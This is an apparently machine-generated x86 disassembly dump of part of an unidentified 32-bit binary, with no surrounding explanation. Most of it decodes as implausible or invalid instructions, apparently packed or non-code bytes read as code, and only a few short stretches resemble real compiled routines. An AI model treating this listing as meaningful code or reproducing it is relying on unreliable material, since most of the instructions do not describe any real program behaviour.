  410512:	ror    DWORD PTR [eax+0xc],1
  410515:	lock pop eax
  410517:	mov    bh,0x8d
  410519:	jns    0x410502
  41051b:	mov    dh,0x94
  41051d:	mov    edx,0x641ed3c5
  410522:	or     dh,bl
  410524:	inc    ebx
  410525:	rcl    BYTE PTR [ecx-0x1f],cl
  410528:	scas   eax,DWORD PTR es:[edi]
  410529:	loopne 0x4104ac
  41052b:	loope  0x41057f
  41052d:	xchg   ecx,eax
  41052e:	mul    BYTE PTR [edx]
  410530:	mov    esi,0xd6ad2330
  410535:	adc    DWORD PTR [ecx],esi
  410537:	(bad)  
  410538:	jecxz  0x4105b6
  41053a:	inc    ecx
  41053b:	test   DWORD PTR [ebp+eiz*8+0x32],ebp
  41053f:	xchg   esi,eax
  410540:	mov    WORD PTR [bx-0x37ee],gs
  410545:	nop
  410546:	imul   ecx,DWORD PTR [ebp-0x7a9f407f],0x430ae745
  410550:	inc    ebp
  410551:	fidivr DWORD PTR [edx-0x5c]
  410554:	or     eax,0xba8febc2
  410559:	jecxz  0x4105cc
  41055b:	sub    eax,0x9ad69113
  410560:	jg     0x41057a
  410562:	add    dh,0xbc
  410565:	xor    eax,0xdf3e3411
  41056a:	cld    
  41056b:	nop
  41056c:	std    
  41056d:	mov    ch,0xc
  41056f:	mov    ebp,0xdd321244
  410574:	mov    ah,0xa1
  410576:	aas    
  410577:	xchg   esi,eax
  410578:	xchg   ecx,eax
  410579:	dec    edi
  41057a:	xlat   BYTE PTR ds:[ebx]
  41057b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41057c:	scas   eax,DWORD PTR es:[edi]
  41057d:	or     bl,BYTE PTR [esi-0x4a]
  410580:	mov    esp,0x9337a08f
  410585:	jecxz  0x410595
  410587:	lock in al,dx
  410589:	dec    ebp
  41058a:	pusha  
  41058b:	test   DWORD PTR [esi+0x18],ebp
  41058e:	call   edi
  410590:	cmc    
  410591:	sbb    ecx,eax
  410593:	or     ebx,0xeae313db
  410599:	ins    DWORD PTR es:[edi],dx
  41059a:	ss ret 
  41059c:	sar    ecx,0x54
  41059f:	mov    al,BYTE PTR [ebx+edx*8+0x46]
  4105a3:	add    dl,dh
  4105a5:	mov    edi,0x1d883c58
  4105aa:	mov    edx,fs
  4105ac:	data16 xor dl,BYTE PTR [edx-0x1d]
  4105b0:	cmp    eax,0xbd591f0f
  4105b5:	std    
  4105b6:	in     al,0x2
  4105b8:	cmp    al,ah
  4105ba:	and    DWORD PTR [ebx],esp
  4105bc:	dec    edx
  4105bd:	sub    edx,DWORD PTR [ecx+0x1a3839fd]
  4105c3:	sbb    al,0xb2
  4105c5:	in     al,0x26
  4105c7:	inc    ecx
  4105c8:	leave  
  4105c9:	jnp    0x4105b5
  4105cb:	outs   dx,BYTE PTR ds:[esi]
  4105cc:	inc    eax
  4105cd:	dec    ebp
  4105ce:	jo     0x41063f
  4105d0:	ret    
  4105d1:	cmp    ebp,DWORD PTR [ebx-0x3c3d8501]
  4105d7:	pop    esp
  4105d8:	mov    ds:0x1bd9109d,al
  4105dd:	mov    esp,0x3852b394
  4105e2:	jg     0x4105a5
  4105e4:	addr16 mov ecx,0xf30496b2
  4105ea:	mov    eax,esp
  4105ec:	lods   al,BYTE PTR ds:[esi]
  4105ed:	imul   esi,esp,0xffffffd8
  4105f0:	adc    BYTE PTR [edi+ebx*4+0x2a],ah
  4105f4:	sbb    BYTE PTR [ecx+eax*1],bh
  4105f7:	(bad)  
  4105f9:	imul   edi,DWORD PTR [edx-0x17],0x44
  4105fd:	sub    dh,BYTE PTR [ebp-0x24cd8220]
  410603:	xchg   edx,eax
  410604:	xchg   ecx,eax
  410605:	push   es
  410606:	sub    DWORD PTR [edi],esi
  410608:	iret   
  410609:	stos   DWORD PTR es:[edi],eax
  41060a:	into   
  41060b:	sahf   
  41060c:	arpl   WORD PTR [esi+0x17],si
  41060f:	pop    ecx
  410610:	jo     0x41066a
  410612:	mov    ebx,DWORD PTR [ebp-0x2c]
  410615:	mov    ecx,DWORD PTR [ebp+0xc]
  410618:	add    esi,DWORD PTR [ecx]
  41061a:	xor    edx,0xcb79b577
  410620:	shrd   edx,eax,0x2
  410624:	xor    ecx,ecx
  410626:	shl    esi,0x1e
  410629:	xor    ecx,edi
  41062b:	shr    eax,0x2
  41062e:	or     ecx,edx
  410630:	xor    esi,0x80000000
  410636:	or     esi,eax
  410638:	mov    DWORD PTR [ebp-0x40],ecx
  41063b:	push   edi
  41063c:	mov    DWORD PTR [ebp-0x3c],esi
  41063f:	mov    eax,DWORD PTR [ebp-0x48]
  410642:	mov    ecx,DWORD PTR [ebp-0x44]
  410645:	push   0xae0404d3
  41064a:	push   ecx
  41064b:	push   eax
  41064c:	call   0x422239
  410651:	mov    ecx,eax
  410653:	mov    eax,DWORD PTR [ebp-0x50]
  410656:	mov    esi,DWORD PTR [ebp-0x4c]
  410659:	or     ecx,eax
  41065b:	mov    eax,DWORD PTR [ebp-0x40]
  41065e:	or     edx,esi
  410660:	jmp    0x410a14
  410665:	pop    ebx
  410666:	icebp  
  410667:	lds    esp,FWORD PTR [eax+0x3abbbc68]
  41066d:	ror    ecx,0xfe
  410670:	fnstsw WORD PTR [esi]
  410672:	sub    BYTE PTR [esi-0x41c31070],cl
  410678:	mov    esi,0xbebec4e3
  41067d:	sbb    BYTE PTR [ebp+0x6],cl
  410680:	ret    0x6a43
  410683:	jae    0x4106c7
  410685:	and    eax,eax
  410687:	inc    ecx
  410688:	rcr    DWORD PTR [ebx],1
  41068a:	adc    ebp,DWORD PTR [ebp+0x5f]
  41068d:	das    
  41068e:	out    dx,al
  41068f:	add    al,0xdf
  410691:	xlat   BYTE PTR ds:[ebx]
  410692:	and    ecx,DWORD PTR [ebp-0x7b204e31]
  410698:	loope  0x4106cf
  41069a:	popa   
  41069b:	test   DWORD PTR [edx],esp
  41069d:	call   0xec0a:0xe191eea9
  4106a4:	(bad)  
  4106a5:	hlt    
  4106a6:	mov    ds:0x199c673e,eax
  4106ab:	inc    edi
  4106ac:	jnp    0x4106e3
  4106ae:	cs or  eax,0x40ae2c44
  4106b4:	fcmovnbe st,st(0)
  4106b6:	sti    
  4106b7:	mov    edi,0x4b3c25f4
  4106bc:	sar    ebx,cl
  4106be:	lock cmp al,0xa8
  4106c1:	mov    edx,0x6358ccd3
  4106c6:	cwde   
  4106c7:	shl    BYTE PTR [eax+0x74],0xda
  4106cb:	adc    dl,0x37
  4106ce:	push   edx
  4106cf:	sbb    BYTE PTR [ebp+0x595af43f],bh
  4106d5:	frstor [ebp+0x68]
  4106d8:	xchg   DWORD PTR [ecx+0x5c],eax
  4106db:	aas    
  4106dc:	nop
  4106dd:	frstor [esp+esi*2-0x30bb01c2]
  4106e4:	adc    DWORD PTR [eax],ebx
  4106e6:	pop    es
  4106e7:	dec    edi
  4106e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106e9:	dec    eax
  4106ea:	int    0xbe
  4106ec:	cld    
  4106ed:	dec    ecx
  4106ee:	xchg   ecx,eax
  4106ef:	imul   eax,DWORD PTR [ebx],0xcf28ca15
  4106f5:	mov    al,0x1f
  4106f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106f8:	jb     0x410738
  4106fa:	jg     0x4106db
  4106fc:	pop    esp
  4106fd:	scas   eax,DWORD PTR es:[edi]
  4106fe:	lods   al,BYTE PTR ds:[esi]
  4106ff:	ret    0xe7d9
  410702:	clc    
  410703:	mov    eax,DWORD PTR [edi+ebx*4-0x56945812]
  41070a:	inc    edi
  41070b:	mov    al,BYTE PTR [ecx-0x58]
  41070e:	cmp    al,0x44
  410710:	push   edx
  410711:	test   DWORD PTR [eax-0x25eb43aa],eax
  410717:	not    BYTE PTR [esi-0x174f7e5d]
  41071d:	fcomp  QWORD PTR [eax]
  41071f:	push   ecx
  410720:	mov    ah,0xd2
  410722:	dec    esi
  410723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410724:	mov    dl,0xd9
  410726:	sbb    al,0xd0
  410728:	loop   0x410712
  41072a:	test   eax,0x761516cb
  41072f:	and    al,BYTE PTR [edx]
  410731:	xor    ebp,edx
  410733:	cmc    
  410734:	call   0x44cc4ecc
  410739:	stos   DWORD PTR es:[edi],eax
  41073a:	xchg   esp,eax
  41073b:	dec    edi
  41073c:	retf   0xf334
  41073f:	dec    esp
  410740:	cmp    BYTE PTR [esi-0x197b5cef],cl
  410746:	xchg   esp,eax
  410747:	pop    edx
  410748:	scas   eax,DWORD PTR es:[edi]
  410749:	arpl   WORD PTR [eax],dx
  41074b:	icebp  
  41074c:	mov    edx,0xc6f17118
  410751:	das    
  410752:	dec    ebx
  410753:	rcr    DWORD PTR [ecx+0x56ac9c41],cl
  410759:	xchg   BYTE PTR [ebp+0xe],dh
  41075c:	inc    ebx
  41075d:	stc    
  41075e:	sbb    DWORD PTR [esi-0xfe0b9d6],esp
  410764:	mov    eax,0x530b0d63
  410769:	mov    edx,0x1dd5d3a5
  41076e:	pushf  
  41076f:	ja     0x410749
  410771:	push   ss
  410772:	stc    
  410773:	jns    0x410795
  410775:	dec    ebp
  410776:	jp     0x41074d
  410778:	xor    DWORD PTR [ebp+0x8],eax
  41077b:	xchg   esi,eax
  41077c:	and    al,0x7f
  41077e:	call   0xf620:0x9a7e8eaa
  410785:	cmc    
  410786:	mov    cl,0x57
  410788:	sub    al,0x69
  41078a:	cmp    al,0x19
  41078c:	repz out 0x78,al
  41078f:	mov    edi,0x52e51728
  410794:	popa   
  410795:	adc    ecx,edx
  410797:	sub    dl,ch
  410799:	sub    al,0x2a
  41079b:	repnz fwait
  41079d:	xchg   esp,eax
  41079e:	xor    al,0xa1
  4107a0:	dec    esi
  4107a1:	leave  
  4107a2:	jp     0x410741
  4107a4:	sub    BYTE PTR [ebx+0x1],cl
  4107a7:	push   esi
  4107a8:	add    al,0x5c
  4107aa:	or     BYTE PTR [ebx],bl
  4107ac:	push   0xb7b00c76
  4107b1:	out    0x8a,eax
  4107b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107b4:	loop   0x410758
  4107b6:	mov    ebp,DWORD PTR [edx]
  4107b8:	xor    DWORD PTR [ebp-0x1da6252c],ecx
  4107be:	dec    ecx
  4107bf:	mov    ebp,0x2ab8340c
  4107c4:	pop    ebx
  4107c5:	cmp    eax,ebx
  4107c7:	add    BYTE PTR [ebp+0x78],ah
  4107ca:	fld    QWORD PTR [edi]
  4107cc:	dec    ecx
  4107cd:	push   ebx
  4107ce:	icebp  
  4107cf:	stos   BYTE PTR es:[edi],al
  4107d0:	stc    
  4107d1:	cdq    
  4107d2:	sbb    BYTE PTR [esi+0x503f87cc],bl
  4107d8:	dec    eax
  4107d9:	or     esi,DWORD PTR [ecx+esi*2]
  4107dc:	lahf   
  4107dd:	push   eax
  4107de:	daa    
  4107df:	mov    bl,0xf6
  4107e1:	rol    DWORD PTR [ebp+0x1891a0d],cl
  4107e7:	imul   ebx,DWORD PTR [ebx],0x16
  4107ea:	js     0x410772
  4107ec:	shl    bh,1
  4107ee:	adc    dl,BYTE PTR ds:0xdfe36aa5
  4107f4:	fcom   DWORD PTR [bx+di-0x30]
  4107f8:	cwde   
  4107f9:	pop    ecx
  4107fa:	idiv   BYTE PTR [edi+esi*1]
  4107fd:	mov    ax,WORD PTR [ecx+0x293fb1ae]
  410804:	(bad)
  410807:	std    
  410808:	es push ss
  41080a:	xor    eax,0xda33c3d6
  41080f:	jge    0x41085b
  410811:	xchg   DWORD PTR [edx],ecx
  410813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410814:	ret    0xd7c1
  410817:	imul   ebp,eax,0x324d68d
  41081d:	nop
  41081e:	adc    dl,ah
  410820:	push   esp
  410821:	stc    
  410822:	sub    edx,DWORD PTR [eax]
  410824:	and    BYTE PTR [ebx+0x76753af1],dh
  41082a:	xor    al,BYTE PTR [esi+0x6a3faa51]
  410830:	mov    ebx,0xfe8d7c8c
  410835:	(bad)  
  410836:	stc    
  410837:	in     al,0x92
  410839:	sub    eax,0x1896328d
  41083e:	dec    esp
  41083f:	shl    DWORD PTR fs:[edx+edi*2+0x45],0x2a
  410845:	clc    
  410846:	dec    ecx
  410847:	ins    BYTE PTR es:[edi],dx
  410848:	cli    
  410849:	fcom   DWORD PTR ds:0x99090b84
  41084f:	gs pusha 
  410851:	xor    cl,BYTE PTR [ebp+ebx*1-0x5fb0b5b1]
  410858:	call   0x2f0f:0x4845d65a
  41085f:	ja     0x4108b2
  410861:	into   
  410862:	adc    esp,0x61
  410865:	xor    DWORD PTR [eax],esp
  410867:	std    
  410868:	xchg   ecx,eax
  410869:	popf   
  41086a:	mov    eax,0x90a17f44
  41086f:	shl    DWORD PTR [eax],0xa3
  410872:	and    BYTE PTR [ecx],bh
  410874:	mov    ebx,es
  410876:	mov    esi,0x666f44f2
  41087b:	push   0xfffffff2
  41087d:	cmc    
  41087e:	cli    
  41087f:	int3   
  410880:	dec    esp
  410881:	adc    eax,0xbfd4959f
  410886:	add    DWORD PTR [eax-0xeac5a94],ebx
  41088c:	jle    0x41082e
  41088e:	in     al,dx
  41088f:	fwait
  410890:	cmp    edi,DWORD PTR [ebp-0x1d]
  410893:	xchg   ebp,eax
  410894:	jns    0x410884
  410896:	into   
  410897:	je     0x4108f0
  410899:	mov    eax,ds:0x3a82d930
  41089e:	call   FWORD PTR [edi]
  4108a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108a1:	out    0x8,eax
  4108a3:	daa    
  4108a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108a5:	pop    esp
  4108a6:	sbb    edx,eax
  4108a8:	push   ebp
  4108a9:	out    0xa3,al
  4108ab:	xor    BYTE PTR [ebx-0x392593b6],cl
  4108b1:	sbb    eax,0xd0f5208f
  4108b6:	scas   al,BYTE PTR es:[edi]
  4108b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108b8:	or     eax,0xa0c366db
  4108bd:	lods   al,BYTE PTR ds:[esi]
  4108be:	mov    dh,BYTE PTR [esi]
  4108c0:	sar    DWORD PTR [ebp+0x3c9ad1d0],1
  4108c6:	mov    esi,0x42526e24
  4108cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108cc:	cli    
  4108cd:	jo     0x41087b
  4108cf:	mov    cl,0x56
  4108d1:	bt     DWORD PTR [edx+0x547b2704],esp
  4108d8:	(bad)  
  4108d9:	frstor [ebx-0x12793e41]
  4108df:	push   edi
  4108e0:	ret    0x331
  4108e3:	test   BYTE PTR [ecx],bl
  4108e5:	pusha  
  4108e6:	dec    edi
  4108e7:	lods   al,BYTE PTR ds:[esi]
  4108e8:	jno    0x410957
  4108ea:	xchg   BYTE PTR [ecx],bl
  4108ec:	mov    ds:0x1efbffa3,al
  4108f1:	inc    esp
  4108f2:	mov    bl,0xda
  4108f4:	scas   eax,DWORD PTR es:[edi]
  4108f5:	mov    eax,0x15007d44
  4108fa:	rcl    DWORD PTR [ebp+ebp*8+0x23],0xba
  4108ff:	pusha  
  410900:	fidiv  WORD PTR [edi]
  410902:	sbb    al,BYTE PTR [ecx]
  410904:	add    edi,ebp
  410906:	pusha  
  410907:	mov    esp,0x11a19720
  41090c:	popa   
  41090d:	popa   
  41090e:	and    BYTE PTR [eax-0x79c7aee5],al
  410914:	sbb    al,0x3d
  410916:	sub    BYTE PTR [bx+si+0x3a4],0x3b
  41091c:	jecxz  0x4108dc
  41091e:	daa    
  41091f:	jno    0x410920
  410921:	imul   edi,DWORD PTR [edx],0x925611e5
  410927:	in     eax,0x85
  410929:	push   ds
  41092a:	sub    BYTE PTR [ebx],ch
  41092c:	cwde   
  41092d:	rcr    DWORD PTR [eax+0x5c],0x5c
  410931:	or     al,0x7a
  410933:	jg     0x410909
  410935:	mov    esp,DWORD PTR [eax]
  410937:	jmp    0xef89:0x53a08b97
  41093e:	adc    al,0x86
  410940:	ds xchg esp,eax
  410942:	out    dx,eax
  410943:	ret    
  410944:	addr16 jae 0x41092c
  410947:	xlat   BYTE PTR ds:[ebx]
  410948:	pop    ebx
  410949:	pushf  
  41094a:	add    dl,BYTE PTR [eax]
  41094c:	popa   
  41094d:	mov    dl,0x29
  41094f:	jne    0x4109ba
  410951:	popf   
  410952:	sbb    eax,DWORD PTR [eax]
  410954:	mov    ecx,0xa7060f49
  410959:	jne    0x4109a1
  41095b:	shr    BYTE PTR [edi-0x29b00e0b],cl
  410961:	mov    WORD PTR [esi+0x17],cs
  410964:	(bad)  
  410965:	cli    
  410966:	cmp    eax,0x4f0d5b89
  41096b:	retf   0x9959
  41096e:	in     al,dx
  41096f:	fsub   QWORD PTR [edx-0x35be2a90]
  410975:	jmp    0x302b:0xd77d5044
  41097c:	addr16 jl 0x41096d
  41097f:	jbe    0x41095c
  410981:	aas    
  410982:	mov    esp,0x976cd400
  410987:	hlt    
  410988:	(bad)  [ecx+0x34]
  41098b:	aas    
  41098c:	push   0x5709c52b
  410991:	ret    0x2591
  410994:	xlat   BYTE PTR ds:[ebx]
  410995:	adc    eax,0x8899e7f4
  41099a:	mov    eax,0x7b48fc6
  41099f:	loope  0x4109a8
  4109a1:	mov    edi,0x9ead9856
  4109a6:	imul   ecx,DWORD PTR [esi],0xfffffff5
  4109a9:	mov    eax,ds:0x8f077e89
  4109ae:	jmp    0xd88:0x7ebcee3d
  4109b5:	and    DWORD PTR ds:[edx],0xffffffed
  4109b9:	shl    DWORD PTR [ecx],0x49
  4109bc:	ror    BYTE PTR [ecx-0x69],0x28
  4109c0:	arpl   WORD PTR [eax],dx
  4109c2:	push   esp
  4109c3:	pop    edi
  4109c4:	dec    DWORD PTR [eax-0x27ba36cb]
  4109ca:	ror    DWORD PTR [eax*1+0x7703c21],1
  4109d1:	jno    0x410986
  4109d3:	icebp  
  4109d4:	pushf  
  4109d5:	jo     0x41096f
  4109d7:	ror    BYTE PTR ds:0x9fb75ec0,0x9
  4109de:	xor    BYTE PTR ds:0x7b68edd4,dl
  4109e4:	leave  
  4109e5:	push   cs
  4109e6:	add    al,0xf8
  4109e8:	add    ebp,DWORD PTR [edx-0x53d6ebeb]
  4109ee:	out    dx,eax
  4109ef:	cmp    dl,BYTE PTR [ebx-0x34b98e8e]
  4109f5:	retf   0xc9d4
  4109f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109f9:	enter  0x24e,0x6b
  4109fd:	(bad)  
  4109fe:	std    
  4109ff:	popf   
  410a00:	into   
  410a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a02:	gs call 0x1ae0384a
  410a08:	test   BYTE PTR [edx+ebx*2-0x12],ch
  410a0c:	ror    BYTE PTR [ebx+edx*8+0x6db74ded],1
  410a13:	pop    esi
  410a14:	mov    esi,DWORD PTR [ebp-0x3c]
  410a17:	add    ecx,eax
  410a19:	mov    eax,DWORD PTR [ebp-0x58]
  410a1c:	adc    edx,esi
  410a1e:	mov    esi,DWORD PTR [ebp-0x54]
  410a21:	add    ecx,eax
  410a23:	mov    eax,DWORD PTR [ebp+0x8]
  410a26:	adc    edx,esi
  410a28:	add    ecx,0xffff55a8
  410a2e:	pop    edi
  410a2f:	adc    edx,0xffff64cd
  410a35:	pop    esi
  410a36:	mov    DWORD PTR [eax],ecx
  410a38:	jmp    0x410dec
  410a3d:	pop    esi
  410a3e:	sub    al,0xdf
  410a40:	shr    BYTE PTR [ebx+ebx*1+0x359fbc6e],1
  410a47:	mov    esp,0xdb1c3aa4
  410a4c:	jecxz  0x410a64
  410a4e:	inc    edx
  410a4f:	mov    esi,0xbec4e3be
  410a54:	mov    esi,0x942dff65
  410a59:	add    eax,0x4c67cfe2
  410a5e:	(bad)  
  410a5f:	xor    eax,0xbe2dddc7
  410a64:	xchg   ecx,eax
  410a65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a66:	push   eax
  410a67:	(bad)
  410a6a:	and    BYTE PTR [ebx],dh
  410a6c:	fnstcw WORD PTR [esi]
  410a6e:	inc    eax
  410a6f:	daa    
  410a70:	push   cs
  410a71:	outs   dx,BYTE PTR ds:[esi]
  410a72:	repz pop ebx
  410a74:	push   ecx
  410a75:	pop    ss
  410a76:	sub    DWORD PTR [eax+0x5a6393e3],eax
  410a7c:	xchg   al,al
  410a7e:	and    al,0xc1
  410a80:	dec    ebp
  410a81:	jle    0x410a2a
  410a83:	aaa    
  410a84:	xchg   ebx,eax
  410a85:	inc    esi
  410a86:	pop    ds
  410a87:	sbb    ebx,DWORD PTR [ecx]
  410a89:	sub    BYTE PTR [eax],bh
  410a8b:	sbb    al,0x0
  410a8d:	das    
  410a8e:	inc    ebx
  410a8f:	push   ebx
  410a90:	faddp  st(4),st
  410a92:	push   ss
  410a93:	jle    0x410afe
  410a95:	in     al,dx
  410a96:	push   ss
  410a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a98:	push   edi
  410a99:	nop
  410a9a:	test   DWORD PTR ss:[ebp+ebx*1+0x51ffbd60],ebx
  410aa2:	jno    0x410aa0
  410aa4:	pop    ecx
  410aa5:	add    eax,0xba3fc2ad
  410aaa:	idiv   BYTE PTR [edi-0x737884a3]
  410ab0:	or     eax,0x99e581d9
  410ab5:	mov    edx,DWORD PTR [ecx-0x57]
  410ab8:	popa   
  410ab9:	sbb    eax,0x4aed7d77
  410abe:	fs loopne 0x410b34
  410ac1:	shl    DWORD PTR [ebp+0x2a09004e],cl
  410ac7:	neg    DWORD PTR [edi+0x2]
  410aca:	mov    ebp,eax
  410acc:	dec    edi
  410acd:	and    dh,0x74
  410ad0:	inc    ebx
  410ad1:	int    0x7a
  410ad3:	xchg   BYTE PTR [eax+edx*2+0xea49a10],cl
  410ada:	loope  0x410aea
  410adc:	hlt    
  410add:	cmp    ebx,DWORD PTR [edi-0x710d80be]
  410ae3:	pop    edx
  410ae4:	sub    al,0x6f
  410ae6:	or     DWORD PTR [ebp+0x55fa9d28],esp
  410aec:	(bad)  
  410aed:	into   
  410aee:	test   al,0x24
  410af0:	imul   ebx,ecx,0x24
  410af3:	xchg   eax,ebx
  410af5:	mov    bh,0x42
  410af7:	inc    ebx
  410af8:	adc    eax,0x17ad57ef
  410afd:	and    BYTE PTR [eax+esi*4+0x69],cl
  410b01:	cwde   
  410b02:	inc    esi
  410b03:	test   DWORD PTR [ebx+0x63],edx
  410b06:	or     bl,bh
  410b08:	sbb    eax,0xdd4261b8
  410b0d:	enter  0xe427,0x1b
  410b11:	bsr    edx,DWORD PTR [edx-0x23]
  410b15:	jg     0x410b93
  410b17:	xchg   edi,eax
  410b18:	jp     0x410b96
  410b1a:	ja     0x410b44
  410b1c:	loope  0x410b33
  410b1e:	xlat   BYTE PTR ds:[ebx]
  410b1f:	mov    esp,0x6aaecb8d
  410b24:	inc    ecx
  410b25:	leave  
  410b26:	cmp    bh,BYTE PTR [ebx+0x49896151]
  410b2c:	xchg   ebx,eax
  410b2d:	xchg   esp,eax
  410b2e:	push   ecx
  410b2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b30:	retf   0x4c7c
  410b33:	(bad)  
  410b34:	std    
  410b35:	mov    WORD PTR [edx],fs
  410b37:	pop    ds
  410b38:	jnp    0x410baf
  410b3a:	jge    0x410b92
  410b3c:	dec    esi
  410b3d:	xlat   BYTE PTR ds:[ebx]
  410b3e:	clc    
  410b3f:	and    al,BYTE PTR [ebx]
  410b41:	lods   al,BYTE PTR ds:[esi]
  410b42:	out    0xf,al
  410b44:	push   ds
  410b45:	push   eax
  410b46:	cwde   
  410b47:	sbb    eax,0x9dd2181
  410b4c:	xchg   esp,eax
  410b4d:	adc    dl,BYTE PTR [esi+0x5f]
  410b50:	add    bh,bl
  410b52:	lock (bad) 
  410b54:	out    0xdf,eax
  410b56:	iret   
  410b57:	mov    ch,0xb9
  410b59:	in     al,0xc6
  410b5b:	cdq    
  410b5c:	mov    bh,0x12
  410b5e:	(bad)  
  410b5f:	arpl   WORD PTR [edx+eiz*4+0x58131013],cx
  410b66:	mov    ah,0x44
  410b68:	lock and cl,BYTE PTR [ecx+0x66]
  410b6c:	xor    eax,DWORD PTR ds:0x4e6a2edc
  410b72:	jp     0x410b0a
  410b74:	sub    ebx,edi
  410b76:	gs dec ebp
  410b78:	inc    ebx
  410b79:	aad    0xe4
  410b7b:	cdq    
  410b7c:	aaa    
  410b7d:	push   0x7992f172
  410b82:	retf   0xd346
  410b85:	mov    al,ds:0x14ed2d04
  410b8a:	mov    ebp,0x286b9cee
  410b8f:	sub    BYTE PTR [ecx+0x27],bh
  410b92:	imul   ecx,DWORD PTR [edx+eax*2],0xd54e99a2
  410b99:	out    0xbe,al
  410b9b:	fsub   st(6),st
  410b9d:	(bad)  
  410b9e:	dec    ebp
  410b9f:	jecxz  0x410b8e
  410ba1:	push   0x313d9959
  410ba6:	jo     0x410ba3
  410ba8:	push   esp
  410ba9:	push   0x74
  410bab:	xor    ebx,DWORD PTR [esi]
  410bad:	xor    al,BYTE PTR [ecx-0x22]
  410bb0:	dec    edx
  410bb1:	cwde   
  410bb2:	leave  
  410bb3:	pusha  
  410bb4:	add    ah,dl
  410bb6:	out    0xe6,eax
  410bb8:	out    dx,eax
  410bb9:	cwde   
  410bba:	xlat   BYTE PTR ds:[ebx]
  410bbb:	mov    ds:0x662d282b,al
  410bc0:	inc    esi
  410bc1:	or     ecx,esi
  410bc3:	inc    edi
  410bc4:	pop    esi
  410bc5:	xchg   esp,eax
  410bc6:	push   ds
  410bc7:	stc    
  410bc8:	inc    ecx
  410bc9:	cmp    al,BYTE PTR [ebx-0x3c]
  410bcc:	mov    ds:0xccc7f82e,al
  410bd1:	jo     0x410be6
  410bd3:	xor    edi,DWORD PTR [edx-0x7de1ad8a]
  410bd9:	mov    ah,0x1e
  410bdb:	aas    
  410bdc:	or     al,0x6d
  410bde:	repnz mov eax,0x5cfd5a83
  410be4:	mov    bl,0x1e
  410be6:	or     ecx,DWORD PTR [esi]
  410be8:	jne    0x410bf0
  410bea:	push   ds
  410beb:	inc    ebx
  410bec:	shr    DWORD PTR [edi-0x9],1
  410bef:	es enter 0xf47e,0xcc
  410bf4:	inc    ecx
  410bf5:	mov    eax,DWORD PTR [ebp-0x630c62a6]
  410bfb:	adc    eax,0xa1722574
  410c00:	inc    ecx
  410c01:	push   ebp
  410c02:	push   ds
  410c03:	sub    eax,0x55514598
  410c08:	mov    ?,esi
  410c0a:	jle    0x410c01
  410c0c:	add    eax,0xe33144d9
  410c11:	jb     0x410c4f
  410c13:	sub    al,0xeb
  410c15:	dec    ebx
  410c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c17:	test   bh,0x1
  410c1a:	xor    dl,BYTE PTR [esi-0x5b9b528d]
  410c20:	lods   eax,DWORD PTR ds:[esi]
  410c21:	fimul  WORD PTR [ebx]
  410c23:	dec    esp
  410c24:	push   edx
  410c25:	(bad)  
  410c26:	fnsave [eax-0x3a]
  410c29:	ins    DWORD PTR es:[edi],dx
  410c2a:	xor    eax,0x28e3a86
  410c2f:	ja     0x410c7e
  410c31:	shl    BYTE PTR [ebx-0x4d],cl
  410c34:	and    al,0x72
  410c36:	xchg   ebp,eax
  410c37:	xor    ebp,DWORD PTR [eax]
  410c39:	ds ins BYTE PTR es:[edi],dx
  410c3b:	add    eax,0x52
  410c3e:	imul   ebx,DWORD PTR [edi],0x76413eed
  410c44:	loopne 0x410be1
  410c46:	push   ebx
  410c47:	add    eax,0xb8348e72
  410c4c:	fld    QWORD PTR [eax+0x5f]
  410c4f:	jge    0x410c90
  410c51:	mov    al,ds:0x683af085
  410c56:	rcl    BYTE PTR [esi+ebx*2],cl
  410c59:	xor    dl,dh
  410c5b:	jmp    0x410ca4
  410c5d:	js     0x410bee
  410c5f:	push   es
  410c60:	or     DWORD PTR [ebx-0x6690df1f],edi
  410c66:	xchg   ebp,eax
  410c67:	xchg   ebx,eax
  410c68:	inc    ebx
  410c69:	add    BYTE PTR ds:0x1fca7b13,al
  410c6f:	jne    0x410c24
  410c71:	fistp  WORD PTR [edi-0x22]
  410c74:	jb     0x410cc6
  410c76:	into   
  410c77:	xchg   edx,eax
  410c79:	lods   eax,DWORD PTR ds:[esi]
  410c7a:	ret    0xef4b
  410c7d:	imul   esp,ecx,0x5c
  410c80:	int    0xe9
  410c82:	push   es
  410c83:	rcl    BYTE PTR [ebx-0x39ad25eb],1
  410c89:	sub    eax,0x82d46e13
  410c8e:	and    DWORD PTR [esi+0x51],eax
  410c91:	jp     0x410cf6
  410c93:	add    dl,BYTE PTR [ebp-0x7e53ed78]
  410c99:	or     BYTE PTR [edx+0x27],ch
  410c9c:	out    0xc6,al
  410c9e:	push   es
  410c9f:	inc    edx
  410ca0:	iret   
  410ca1:	fmul   DWORD PTR [eax+eax*1]
  410ca4:	xchg   esi,eax
  410ca5:	mov    ah,0x68
  410ca7:	cmp    eax,0x926497b6
  410cac:	jmp    0x410ce4
  410cae:	data16 or BYTE PTR [eax+0x4de97503],dl
  410cb5:	gs sar eax,cl
  410cb8:	stc    
  410cb9:	ret    0xbc3d
  410cbc:	add    ah,ch
  410cbe:	call   0xe0e3e46f
  410cc3:	call   0x245a0d80
  410cc8:	int3   
  410cc9:	push   edx
  410cca:	push   eax
  410ccb:	cwde   
  410ccc:	push   es
  410ccd:	std    
  410cce:	mov    ds:0xba7cba55,al
  410cd3:	mov    edx,DWORD PTR [ebx+ecx*8+0xfd9038a]
  410cda:	loop   0x410d21
  410cdc:	xchg   esi,eax
  410cdd:	add    ebp,ebp
  410cdf:	lods   eax,DWORD PTR ds:[esi]
  410ce0:	or     eax,0xbdcf53a2
  410ce5:	jne    0x410c7a
